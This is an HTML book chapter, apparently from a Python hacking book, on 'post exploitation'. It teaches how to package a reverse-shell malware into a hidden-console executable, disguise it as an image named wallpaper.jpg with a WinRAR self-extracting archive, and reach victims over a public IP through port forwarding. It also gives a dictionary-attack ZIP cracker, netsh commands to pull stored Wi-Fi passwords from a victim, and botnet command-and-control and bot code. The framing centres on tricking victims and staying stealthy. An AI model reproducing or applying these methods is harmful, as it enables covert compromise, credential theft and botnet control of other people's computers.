<html><head></head><body>
		<div id="_idContainer142">
			<h1 id="_idParaDest-153"><a id="_idTextAnchor160"/>Chapter 8: Post Exploitation</h1>
			<p>In <a href="B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Malware</em>, we learned how to add some advanced functionalities to our malware program. You can add any number of functionalities you want to your malware. Once you are done writing your code, next comes the implementation part. How do you package your malware and make it useful for deployment? In this chapter, we will learn about the following aspects of malware deployment:</p>
			<ul>
				<li>Packaging the malware</li>
				<li>Understanding trojans</li>
				<li>Attacking over a public IP</li>
				<li>Cracking passwords</li>
				<li>Stealing passwords</li>
				<li>Creating botnets</li>
			</ul>
			<h1 id="_idParaDest-154"><a id="_idTextAnchor161"/>Packaging the malware</h1>
			<p>The program we developed in <a href="B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Malware</em>, was a Python file. It also contained <a id="_idIndexMarker421"/>some dependencies. It is very hard to run a Python file on a victim's machine without having physical access to it. This makes our program not very useful unless we have a way to package everything together into a single executable that we can ship to the victim and when the victim opens it, it creates a reverse shell to the hacker's computer.</p>
			<p>Packaging together Python code into a workable executable file requires that we also include all the dependencies of the program. This is the exact reason why we work with <em class="italic">virtual environments</em>. They enable the program to keep all dependencies together so that when we package our code, everything including the Python interpreter is included in the executable so that we don't need to install anything on the victim computer for our program to work perfectly. </p>
			<h2 id="_idParaDest-155"><a id="_idTextAnchor162"/>Understanding the pyinstaller library</h2>
			<p>Fortunately, there is a way to achieve the objectives mentioned previously. This is done by using a Python <a id="_idIndexMarker422"/>library called <strong class="source-inline">pyinstaller</strong>. This helps us to package our code nicely in a binary executable with the extension <strong class="source-inline">.exe</strong> for Windows. To install <strong class="source-inline">pyinstaller</strong>, write the following command: </p>
			<p class="source-code">pip install pyinstaller</p>
			<p>Note that this command should be installed with the virtual environment enabled so that we have all the required dependencies available. Open your victim program for the advanced malware and enable the virtual environment. Once done, install <strong class="source-inline">pyinstaller</strong> using the preceding command. </p>
			<p>If you haven't created the virtual environment, you can do so by running the following command in the folder where your Python malware file is present: </p>
			<p class="source-code">python -m venv myenv</p>
			<p>Wait for some moments for the install to finish. Once it is done, you can activate the environment by either starting a new terminal or running the <strong class="source-inline">activate.bat</strong> script in the script folder or <strong class="source-inline">myenv</strong>. </p>
			<p>If you have activated the Python environment successfully, you will see something like this: </p>
			<div>
				<div id="_idContainer121" class="IMG---Figure">
					<img src="image/B14788_08_01.jpg" alt="Figure 8.1 – Python environment enabled &#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.1 – Python environment enabled </p>
			<p>Note that we used an external dependency, <strong class="source-inline">pyautogui</strong>, in our advanced malware. We need to install this dependency in our virtual environment as well. If you have any other feature added to your malware that requires external dependencies, install those as well. Once all the dependencies are installed, you can install <strong class="source-inline">pyinstaller</strong> in the virtual environment with <strong class="source-inline">pip install pyinstaller</strong>. If you have everything done properly, write <strong class="source-inline">pyinstaller</strong> in your command terminal and you should see the following output: </p>
			<div>
				<div id="_idContainer122" class="IMG---Figure">
					<img src="image/B14788_08_02.jpg" alt="Figure 8.2 – pyinstaller installation&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption"> </p>
			<p class="figure-caption">Figure 8.2 – pyinstaller installation</p>
			<p>In <em class="italic">Figure 8.2</em>, you can see the list of options available for <strong class="source-inline">pyinstaller</strong>. Next, to make an executable, write <strong class="source-inline">pyinstaller –onefile advanced_malware.py</strong>. This will compile all the code along with its <a id="_idIndexMarker423"/>dependencies into a single file and create the folder structure as follows: </p>
			<div>
				<div id="_idContainer123" class="IMG---Figure">
					<img src="image/B14788_08_03.jpg" alt="Figure 8.3 – Folder structure&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.3 – Folder structure</p>
			<p>The folder that you are concerned with is the <strong class="source-inline">dist</strong> folder, which stands for distribution. Your executable will be located here. Go ahead and open this folder in File Explorer: </p>
			<div>
				<div id="_idContainer124" class="IMG---Figure">
					<img src="image/B14788_08_04.jpg" alt="Figure 8.4 – Executable file&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.4 – Executable file</p>
			<p>You will find an executable with the same name as your Python filename, and it will have the <strong class="source-inline">.exe</strong> extension. Now if you simply run this file while your hacker program is running, you will <a id="_idIndexMarker424"/>get a connection back. No matter whether the victim has Python installed on its system or not, this executable will work. Go ahead and run your hacker program and then double-click on this executable to open it. The hacker program will look like this: </p>
			<div>
				<div id="_idContainer125" class="IMG---Figure">
					<img src="image/B14788_08_05.jpg" alt="Figure 8.5 – Hacker program&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.5 – Hacker program</p>
			<p>Similarly, on the victim PC, you will see a console popup with a similar screen: </p>
			<div>
				<div id="_idContainer126" class="IMG---Figure">
					<img src="image/B14788_08_06.jpg" alt="Figure 8.6 – Running the executable on the victim&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.6 – Running the executable on the victim</p>
			<p>If you look carefully at the top of <em class="italic">Figure 8.6</em>, you will see the name of the executable running. You can clearly see that instead of a Python script, we are now running an executable file while achieving the same objective. </p>
			<p>However, there is a small issue here. If the victim clicks on this executable, they will see a command prompt <a id="_idIndexMarker425"/>pop up displaying everything that is happening, which is clearly not what we want as this will alert the victim that something is happening. We want this to happen in the background so that the victim has no idea what is happening. To hide the console, we can add the following parameter to the command:</p>
			<p class="source-code">pyinstaller –-onefile –-noconsole advanced_malware.py</p>
			<p>If you click the executable file now while the hacker program is running, you will see that nothing happens on the screen, as no pop-up console is displayed, however, the connection will be established in the background. You can see that the executable is running in the background by opening Task Manager: </p>
			<div>
				<div id="_idContainer127" class="IMG---Figure">
					<img src="image/B14788_08_07.jpg" alt="Figure 8.7 – Background process&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.7 – Background process</p>
			<p>In the background processes in the preceding screenshot, you can see that the program is running, and a connection will be established. Note that if your program doesn't run commands properly <a id="_idIndexMarker426"/>on the victim machine, go to your victim program and where you are executing commands on the system and add the following parameter: <strong class="source-inline">stdin=subprocess.DEVNULL</strong>. The complete command will look like this: </p>
			<p class="source-code">output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)</p>
			<p>The reason this error occurs is the standard input for the console is not handled properly. If you run any command on the hacker program, it should run properly. See the following example where I run the <strong class="source-inline">dir</strong> command: </p>
			<div>
				<div id="_idContainer128" class="IMG---Figure">
					<img src="image/B14788_08_08.jpg" alt="Figure 8.8 – Executing the command in &quot;noconsole&quot; mode &#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.8 – Executing the command in "noconsole" mode </p>
			<p>Now we have created quite a stealthy malware, which can run in the background on the victim computer and give us control of the victim PC as well. But there is still a small problem with this <a id="_idIndexMarker427"/>program as it requires the user to click on the malware executable, which can be difficult or easy depending on the victim. If the user is not very tech-savvy, you can easily trick them into running it, otherwise, it will be difficult. Now we will move our discussion to trojans and how they work. We will also build a small trojan malware in the following section.</p>
			<h1 id="_idParaDest-156"><a id="_idTextAnchor163"/>Understanding trojans</h1>
			<p>In the previous section, we created an executable that can be run with a single click and you will then have a reverse connection with the victim, but this requires the victim to manually open and <a id="_idIndexMarker428"/>click on the executable. Here comes the concept of a <strong class="bold">trojan</strong>. A trojan is a malware program that hides in a very unsuspecting manner. Usually, these trojan malwares are merged or bundled together with legitimate software and run when the victim tries to open a legitimate application or file. You will see that a lot of the time, these viruses are merged with PDF or image files. Hiding malwares inside a trojan is a complicated task, since a lot of the time, the tricks that you learn are quickly patched in the updates for the software that you are using. For example, let's say that you discover a vulnerability in software that allows you to embed malware in a file. Unless you are the first one to discover this vulnerability, it is quite possible that this will be patched in a day or two. </p>
			<h2 id="_idParaDest-157"><a id="_idTextAnchor164"/>Adding an icon to an executable</h2>
			<p>If we take a look at our executable that we developed in the previous section, it has a Python icon, which can make it look like it's a Python executable. This is not very helpful for hacking <a id="_idIndexMarker429"/>purposes as it can easily be detected. One way is to add an image icon to the executable to make it look like an image instead of an executable. This will make it seem like the user is clicking to open an image while, instead, they will be running the executable. We can add the icon using <strong class="source-inline">pyinstaller</strong>. To do this, we need an image with a <strong class="source-inline">.ico</strong> extension. </p>
			<p>Take any image and convert the extension to <strong class="source-inline">.ico</strong>. You can use any online tool to convert it and it should be easy. I will be using the following example website to convert my image to ICO format: <a href="http://online-convert.com">online-convert.com</a>.</p>
			<p>Once you are done converting the image, place the converted file into the same directory as where your victim malware program is located. Once done, you can use the following command to add an icon to your executable. </p>
			<p>You can name the file <strong class="source-inline">icon.ico</strong> and write the following command for <strong class="source-inline">pyinstaller</strong>: </p>
			<p class="source-code">pyinstaller –-onefile –-noconsole –icon=icon.ico advanced_malware.py</p>
			<p>If you open the <strong class="source-inline">dist</strong> folder, you will see that, now, instead of a Python icon, your executable will have a different icon, depending on the image that you chose. My file looks like this: </p>
			<div>
				<div id="_idContainer129" class="IMG---Figure">
					<img src="image/B14788_08_09.jpg" alt="Figure 8.9 – Trojan icon&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.9 – Trojan icon</p>
			<p>In the preceding screenshot, you can see that the icon has changed now and it is now easy to trick the victim into clicking this file. Now if you click this file, you will see that it runs a background connection to the hacker, which you can verify by using Task Manager from Windows. </p>
			<h2 id="_idParaDest-158"><a id="_idTextAnchor165"/>Creating your own trojan</h2>
			<p>The preceding trojan will work in some cases and it should be enough. However, when the user clicks <a id="_idIndexMarker430"/>and nothing happens on the victim computer, the user might guess that something is wrong. Ideally, we would want to open an image when the user clicks on the executable and to create a simultaneous connection back to the hacker. So, the user thinks that they have just opened the image, when in fact, they have opened the image and also created the reverse shell to the hacker. In this section, we will try to further hide our malware. </p>
			<p>To create a malware trojan, you will need four items, such as the following: </p>
			<ol>
				<li>Your malware executable with the icon</li>
				<li>The <em class="italic">WinRAR</em> program</li>
				<li>The image to be used for the icon in .<strong class="source-inline">jpg</strong> format</li>
				<li>The icon image with the .<strong class="source-inline">ico</strong> extension</li>
			</ol>
			<p>Install the <em class="italic">WinRAR</em> software from this website: https://www.win-rar.com/.</p>
			<p>The process <a id="_idIndexMarker431"/>should be simple. Once done, copy the executable (<em class="italic">1</em>), image (<em class="italic">3</em>), and icon (<em class="italic">4</em>) to a new folder. I have created a new folder called <strong class="source-inline">trojan</strong> and pasted all three items in it: </p>
			<div>
				<div id="_idContainer130" class="IMG---Figure">
					<img src="image/B14788_08_10.jpg" alt="Figure 8.10 – Trojan contents&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.10 – Trojan contents</p>
			<p>The first <strong class="source-inline">advanced_malware.exe</strong> is the executable, the second is the icon file, and the third is the .<strong class="source-inline">jpg</strong> image for the icon. </p>
			<p>Now select all three files and right-click to select the <strong class="bold">Add to archive</strong> option:</p>
			<div>
				<div id="_idContainer131" class="IMG---Figure">
					<img src="image/B14788_08_11.jpg" alt="Figure 8.11 – Add to archive&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.11 – Add to archive</p>
			<p>This will <a id="_idIndexMarker432"/>open a new dialog box. It will look like this:</p>
			<div>
				<div id="_idContainer132" class="IMG---Figure">
					<img src="image/B14788_08_12.jpg" alt="Figure 8.12 – WinRAR dialog box&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.12 – WinRAR dialog box</p>
			<p>Let's rename <a id="_idIndexMarker433"/>the file to <strong class="source-inline">wallpaper.jpg</strong>. Select the compression method of <strong class="bold">Best</strong> and check the <strong class="bold">Create SFX archive</strong> box. Now go to the <strong class="bold">Advanced</strong> tab and open <strong class="bold">SFX options</strong>. </p>
			<p>It will open a new dialog box. Go to the <strong class="bold">Update</strong> tab and select <strong class="bold">Extract and update files</strong> and <strong class="bold">Overwrite all files</strong>:</p>
			<div>
				<div id="_idContainer133" class="IMG---Figure">
					<img src="image/B14788_08_13.jpg" alt="Figure 8.13 – SFX options&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.13 – SFX options</p>
			<p>Next, go to <a id="_idIndexMarker434"/>the <strong class="bold">Text and icon</strong> tab and select the <strong class="bold">Browse</strong> button to select the <strong class="source-inline">icon.ico</strong> file. Navigate to the file and select it: </p>
			<div>
				<div id="_idContainer134" class="IMG---Figure">
					<img src="image/B14788_08_14.jpg" alt="Figure 8.14 – Selecting icons&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.14 – Selecting icons</p>
			<p>Then go to <a id="_idIndexMarker435"/>the <strong class="bold">Modes</strong> tab and check <strong class="bold">Unpack to temporary folder</strong> and also select <strong class="bold">Hide all </strong>for <strong class="bold">Silent mode</strong>:</p>
			<div>
				<div id="_idContainer135" class="IMG---Figure">
					<img src="image/B14788_08_15.jpg" alt="Figure 8.15 – SFX mode&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.15 – SFX mode</p>
			<p>Finally, go to <a id="_idIndexMarker436"/>the <strong class="bold">Setup</strong> tab and write the following in the <strong class="bold">Run after extraction</strong> field: </p>
			<div>
				<div id="_idContainer136" class="IMG---Figure">
					<img src="image/B14788_08_16.jpg" alt="Figure 8.16 – Run after extraction&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.16 – Run after extraction</p>
			<p>This will allow <a id="_idIndexMarker437"/>us to run the files in sequence after we are done extracting. First, we will open the actual image that is shown to the victim, and in the background, we will also run the malware, which will give the hacker a reverse connection. </p>
			<p>Now everything is set up as per our needs. Just click <strong class="bold">OK</strong> to create the compressed file and it will create a new file in the same folder with the name <strong class="source-inline">wallpaper.jpg</strong>. On the surface, it looks like a normal image file but if you open it, you will see that it creates a reverse connection, if you have the hacker server running: </p>
			<div>
				<div id="_idContainer137" class="IMG---Figure">
					<img src="image/B14788_08_17.jpg" alt="Figure 8.17 – Trojan&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.17 – Trojan</p>
			<p>In <em class="italic">Figure 8.16</em>, you can see that we have created a trojan named <strong class="source-inline">wallpaper.jpg</strong>. If you look very closely, you can see that it has the type <strong class="bold">Application</strong> but in Windows, extensions are <a id="_idIndexMarker438"/>hidden by default and we have added the name <strong class="source-inline">wallpaper.jpg</strong> to it so it looks like an image. And if you click on the image, it will open the image and concurrently create a reverse connection with the hacker. Go ahead and try it yourself. Our current malware attack has only worked over a private IP until now. In the next section, we will learn how to perform the same attack over a public IP. </p>
			<h1 id="_idParaDest-159"><a id="_idTextAnchor166"/>Attack over a public IP</h1>
			<p>So far, all the attacks we have done are on the local network. This requires you, the hacker, and the victim to be connected to the same network. This will likely not be the case for a lot <a id="_idIndexMarker439"/>of attack scenarios. This is where a public IP comes into play. We have already learned about public and private IP addresses while discussing an introduction to networking. In order to create a successful attack, we need to know the public IP of the hacker. On the hacker machine, you can find your public IP by going to <a href="http://google.com">google.com</a> and typing <strong class="source-inline">my public ip</strong> and this will display your public IP address provided you are not using any VPN or network masking schemes. It will be a similar 32-bit address, which is provided to you by your ISP. My public IP is <strong class="source-inline">31.38.10.X</strong>. The last 8 bits are masked due to privacy issues. Your IP will be different depending on where you live. It should not be very difficult to find. Once you have your public IP address, go to the victim program and instead of writing the private IP of the hacker, write the public IP of the hacker.</p>
			<p>The first part of our puzzle is done. The next part is for packets to successfully reach the hacker machine. The hacker must be able to receive packets on the specified port. To do this, the hacker must enable <em class="italic">port forwarding</em> in their router settings. Port forwarding is disabled by default in most router settings for security purposes. However, if you know the password for the router panel, you can do this. In order to access these settings, find your Wi-Fi router and most likely there will be a sticker on the back of the router with the router's server address. It will be like <strong class="source-inline">192.168.1.1</strong> or something like that. Note that this will depend on your specific router and I can't provide it to you. There will also be a password and username written on the router. Go to your router settings page. </p>
			<p>Once you are <a id="_idIndexMarker440"/>on your router settings, find the <strong class="bold">Port forwarding</strong> settings. These will depend on your router. There you will see an option for which port you want to forward the packets to. Enter the port number that you are using for your hacker program and save the settings. Now you are done, and you can carry out attacks over a public IP as well. This will help you attack victims that are not located in your local network. </p>
			<h1 id="_idParaDest-160"><a id="_idTextAnchor167"/>Cracking passwords</h1>
			<p>In this section, we will learn how to crack password-protected files using a password database. We will try to crack a ZIP file in this section. A ZIP file is a binary format that stores files in <a id="_idIndexMarker441"/>compressed format and can be password protected. We will carry out a dictionary attack. Let's first learn what a dictionary attack is!</p>
			<p>A dictionary attack is an attack in which a hacker tries to guess the victim's password by using a set of predefined passwords. They usually have a very large database of passwords stored in a file and try to use one of the passwords to see if the victim's password matches the password list. This password list is usually obtained from a leak of passwords from a compromised website and other forums. This is why you should never reuse a password for one website more than once. If you use the same password for a website and the website gets compromised, chances are that all your passwords could be compromised. </p>
			<p>You can find a list of the most widely used passwords here: <a href="https://github.com/danielmiessler/SecLists&#13;">https://github.com/danielmiessler/SecLists.</a></p>
			<p>This list contains around 10 million passwords and is updated regularly. If a user uses a password that is stored in this file, you can easily crack it. </p>
			<p>I have downloaded a file from the previously mentioned GitHub repo. Let's take a look at its contents. </p>
			<p>Create a new project and store this password file from the repo in the project. Also, copy the password-protected ZIP file to the project. I have created a dummy file called <strong class="source-inline">secret file.txt</strong>, which is password-protected in ZIP format. The password is <strong class="source-inline">qwerty</strong>, which is located in the password database file as well. The password file looks like this:</p>
			<div>
				<div id="_idContainer138" class="IMG---Figure">
					<img src="image/B14788_08_18.jpg" alt="Figure 8.18 – Password database file&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.18 – Password database file</p>
			<p>To crack the file, we will <a id="_idIndexMarker442"/>need the <strong class="source-inline">zipfile</strong> Python library, which is a part of the Python standard package, so we don't need to install it. Import this into your script using the following:</p>
			<p class="source-code">import zipfile</p>
			<p class="source-code">encrypted_filename= "secret file.zip"</p>
			<p class="source-code">zFile = zipfile.ZipFile(encrypted_filename)</p>
			<p>We will create a ZIP file object and pass the encrypted filename to it. Next, we need to open the password database file as well, in read mode so that we can match the passwords: </p>
			<p class="source-code">passFile = open("passwords.txt", "r")</p>
			<p class="source-code">for line in passFile.readlines():</p>
			<p class="source-code">    test_password = line.strip("\n").encode('utf-8')</p>
			<p class="source-code">    try:</p>
			<p class="source-code">        print(test_password)</p>
			<p class="source-code">        zFile.extractall(pwd=test_password)</p>
			<p class="source-code">        print("Match found")</p>
			<p class="source-code">   break</p>
			<p class="source-code">    except Exception as err:</p>
			<p class="source-code">        pass</p>
			<p>In the previous code, we read the passwords one by one and tested them. Note that in order to test a password, it should be in binary form instead of string format. If the password doesn't match, we simply <a id="_idIndexMarker443"/>raise an exception and move to the next password. If it matches, we print the <strong class="source-inline">Match found</strong> statement and break the loop and if we look at the directory you will see that a new folder will be created, which will contain an unencrypted file: </p>
			<div>
				<div id="_idContainer139" class="IMG---Figure">
					<img src="image/B14788_08_19.jpg" alt="Figure 8.19 – Password cracking&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.19 – Password cracking</p>
			<p>Here we are testing various passwords and when the password matches, we extract the file and break the loop, as you can clearly see that the password is <strong class="source-inline">qwerty</strong>. In this section, we have learned how to crack password-protected files. In the next section, we will learn how to create botnets and how they can be useful to us. </p>
			<h1 id="_idParaDest-161"><a id="_idTextAnchor168"/>Stealing passwords</h1>
			<p>In this section, we will see how we can steal Wi-Fi passwords stored on the victim PC. Note that we <a id="_idIndexMarker444"/>have already discussed how to execute commands on a Windows machine using our hacker program. We can take advantage of this program to retrieve Wi-Fi passwords. Note that you may not have a Wi-Fi driver installed on your virtual OS. I have this driver installed. If you want, you can use your host PC for this purpose. </p>
			<p>In order to access the stored access points on the victim machine, you need to run the following command: </p>
			<p class="source-code">netsh wlan show profiles</p>
			<p>If you run this command in your Command Prompt, you will see all the access points you have connected <a id="_idIndexMarker445"/>with your PC. But we want to access the passwords, not the access points. Here is the screenshot for my PC: </p>
			<div>
				<div id="_idContainer140" class="IMG---Figure">
					<img src="image/B14788_08_20.jpg" alt="Figure 8.20 – Connected access points&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.20 – Connected access points</p>
			<p>In order to get the passwords, you have to write the name of the access point and give an additional parameter, <strong class="source-inline">key=clear</strong>, to the command. The complete command will look like this:</p>
			<p class="source-code">netsh wlan show profiles "POCO X3 NFC" key=clear</p>
			<p>You will see a similar output:</p>
			<div>
				<div id="_idContainer141" class="IMG---Figure">
					<img src="image/B14788_08_21.jpg" alt="Figure 8.21 – Retrieving passwords&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.21 – Retrieving passwords</p>
			<p>The last field in <strong class="source-inline">Security settings</strong> is the <a id="_idIndexMarker446"/>password for this access point in plain text. You can run these commands with your malware program as well if you have a Wi-Fi driver installed on your virtual OS (Windows). </p>
			<h1 id="_idParaDest-162"><a id="_idTextAnchor169"/>Creating botnets</h1>
			<p>In <a href="B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Malware</em>, we developed a malware program that can contain one hacker and <a id="_idIndexMarker447"/>one victim program. This is useful when you want to carry out an attack on one specific target. However, in a lot of cases, you would want to have one <em class="italic">command and control center</em> for the hacker and a lot of victim programs running on different machines and communicating with one hacker program, with the hacker being able to control these devices remotely. These are what we call <strong class="bold">botnets</strong>. Botnets are <a id="_idIndexMarker448"/>small programs that run on different machines and communicate with one command-and-control center. They are used for a lot of <a id="_idIndexMarker449"/>malicious purposes, such as <strong class="bold">Distributed Denial of Service</strong> (<strong class="bold">DDoS</strong>) attacks, where you make a certain website go offline by generating millions of requests at a time or use the resources of computers to mine cryptocurrency, and so on. </p>
			<p>Let's start creating our own botnet and then create different bots to communicate with the command-and-control center. We will write two programs: one will be called <strong class="source-inline">CnC.py</strong> for the command-and-control center. This will serve the same purpose as a hacker program. The other will be called <strong class="source-inline">bot1.py</strong>. You can create any number of bots that you want, however, for illustration purposes, I will create only one bot. </p>
			<p>Create a new project called <strong class="source-inline">bots</strong> and create a new Python file called <strong class="source-inline">CnC.py</strong>.</p>
			<p>This should be created on a Kali machine.</p>
			<p>We will need the same <strong class="source-inline">socket</strong> library we used before. Let's start with our imports:</p>
			<p class="source-code">import socket</p>
			<p class="source-code">from threading import Thread</p>
			<p class="source-code">import time</p>
			<p>Since we want to create a number of bots, we are using threads for each different bot. Threads are used to create a separate thread that runs concurrently. </p>
			<p>Next, we will create a list of threads and clients. The client will be bots in our case: </p>
			<p class="source-code">threads = []</p>
			<p class="source-code">clients = []</p>
			<p>Next, we will create a function called <strong class="source-inline">listen_for_bots()</strong>, which, as the name indicates, will listen for incoming bot connections: </p>
			<p class="source-code">def listen_for_bots(port):</p>
			<p class="source-code">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
			<p class="source-code">    sock.bind(("", port))</p>
			<p class="source-code">    sock.listen()</p>
			<p class="source-code">    bot, bot_address = sock.accept()</p>
			<p class="source-code">    clients.append(bot)</p>
			<p>This is quite similar to what we did earlier while writing the hacker program. The only difference is that <a id="_idIndexMarker450"/>once the client is connected, we add it to the <strong class="source-inline">client</strong> list so that we can use this connection for various purposes as we did with the hacker program. </p>
			<p>Now we define a <strong class="source-inline">main()</strong> function where all our logic will reside: </p>
			<p class="source-code">def main():</p>
			<p class="source-code">    print("[+] Server bot waiting for incoming connections")</p>
			<p class="source-code">    startig_port = 8085</p>
			<p class="source-code">    bots = 3</p>
			<p>We define the port that we want to use. Note that this is a <strong class="source-inline">starting_port</strong> and we will use different ports for different clients. We will simply add 1 to this number for each new client. The variable <strong class="source-inline">bots=3</strong> suggests that we want to connect only three bots, however, you can add as many clients as you want:</p>
			<p class="source-code">    for i in range(bots):</p>
			<p class="source-code">        t = Thread(target=listen_for_bots, args=(i + startig_port,), daemon=True)</p>
			<p class="source-code">        threads.append(t)</p>
			<p class="source-code">        t.start()</p>
			<p>Next, we will run these threads in a loop. <strong class="source-inline">Daemon=True</strong> means that we want to run these as a background process. Then we append each thread to a list so that we can access the thread. </p>
			<p>Next, we will run a loop for the command-and-control center. While the clients are connected, we will display the clients and ask the hacker to select the client they want to interact with. Next, we run an internal loop for each bot, which will help us send messages to each bot individually by accessing the element in the list. Here you can define your own <a id="_idIndexMarker451"/>logic for a bot. You can send commands over to the bot and run those commands on the PC that the bot is running on. The rest is left up to you to define the functionality as you want. Here we are simply sending a message. Once you have achieved your objective, you can remove the client from the list: </p>
			<p class="source-code">run_cnc = True</p>
			<p class="source-code">    while run_cnc:</p>
			<p class="source-code">        if len(clients) != 0:</p>
			<p class="source-code">            for i, c in enumerate(clients):</p>
			<p class="source-code">                print("\t\t", i, "\t", c.getpeername())</p>
			<p class="source-code">            selected_client = int(input("[+] Select client by index: "))</p>
			<p class="source-code">            bot = clients[selected_client]</p>
			<p class="source-code">            run_bot = True</p>
			<p class="source-code">            while run_bot:</p>
			<p class="source-code">                msg = input("[+] Enter Msg: ")</p>
			<p class="source-code">                msg = msg.encode()</p>
			<p class="source-code">                bot.send(msg)</p>
			<p class="source-code">                if msg.decode() == "exit":</p>
			<p class="source-code">                    run_bot = False</p>
			<p class="source-code">            status = bot.recv(1024)</p>
			<p class="source-code">            if status == "disconnected".encode():</p>
			<p class="source-code">                bot.close()</p>
			<p class="source-code">                clients.remove(bot)</p>
			<p class="source-code">            </p>
			<p class="source-code">            print("data sent")</p>
			<p class="source-code">        else:</p>
			<p class="source-code">            print("[+] No clients connected")</p>
			<p class="source-code">            ans = input("[+] Do you want to exit? press [y/n]  ")</p>
			<p class="source-code">            if ans == "y":</p>
			<p class="source-code">                run_cnc = False</p>
			<p class="source-code">            else:</p>
			<p class="source-code">                run_cnc = True</p>
			<p>Now we have <a id="_idIndexMarker452"/>defined a basic structure for the command-and-control center. The complete code for the bot can be found at the following link: </p>
			<p><a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/CnC.py">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/CnC.py</a> </p>
			<p>Next, we will define the logic for our bot. </p>
			<p>Go to the victim computer and create a new file called <strong class="source-inline">bot1.py</strong>. We will create a socket object and try to communicate with the hacker using the hacker's IP. This step is similar to the malware program we developed earlier: </p>
			<p class="source-code">import socket </p>
			<p class="source-code">if __name__ == "__main__":</p>
			<p class="source-code">    print("[+] Connecting with server")</p>
			<p class="source-code">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
			<p class="source-code">    s.connect(("192.168.0.11", 8085))</p>
			<p>Next, we will create a loop for <strong class="source-inline">run_bot</strong> and try to receive messages that the CNC is sending and once the message is received, you can define your own logic here. Here we will simply print the message, but you can add functionality to your liking. Once the CNC sends an exit <a id="_idIndexMarker453"/>message, we can simply disconnect the client bot from the server. The code is listed as follows:</p>
			<p class="source-code">run_bot = True</p>
			<p class="source-code">    while run_bot:</p>
			<p class="source-code">        communicate_bot = True</p>
			<p class="source-code">        while  communicate_bot:</p>
			<p class="source-code">            msg = s.recv(1024)</p>
			<p class="source-code">            msg = msg.decode()</p>
			<p class="source-code">            print("command center said: ", msg)</p>
			<p class="source-code">            if msg == "exit":</p>
			<p class="source-code">                communicate_bot = False</p>
			<p class="source-code">        # ans = input("[+] do you want to remain connected: ")</p>
			<p class="source-code">        ans = "connected"</p>
			<p class="source-code">        if ans == "no":</p>
			<p class="source-code">            status = "disconnected"</p>
			<p class="source-code">            s.send(status.encode())</p>
			<p class="source-code">            run_bot = False</p>
			<p class="source-code">        else:</p>
			<p class="source-code">            status = "conntected".encode()</p>
			<p class="source-code">            s.send(status)</p>
			<p class="source-code">    s.close()</p>
			<p>The complete code for <strong class="source-inline">bot1.py</strong> is given at the following link:</p>
			<p>https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example13-CNC/bot1.py </p>
			<p>In this section, we have learned how to create a command-and-control center for bot net clients. You can <a id="_idIndexMarker454"/>add any number of clients you want and control them all together with your CNC program. </p>
			<h1 id="_idParaDest-163"><a id="_idTextAnchor170"/>Summary</h1>
			<p>In this chapter, we learned about some methods for how to successfully deploy your malware programs. An important aspect of a malware program is how stealthy it is. This chapter focused on hiding your malware inside images. We learned about malware attacks over a public IP and how a hacker can attack victims that are not present in the same network as the victim. We then learned how to crack a password-protected file using a dictionary attack. Lastly, we learned how to create a command-and-control center for botnet-based attacks. These attacks allow the hacker to control a large number of distributed devices with only one program. After going through this chapter, you should be able to create trojans, perform attacks over a public IP, and create your own botnets. In the next chapter, we will learn how you can protect your online identity as a hacker and how important this aspect is to a successful attack. See you in the next chapter! </p>
		</div>
	</body></html>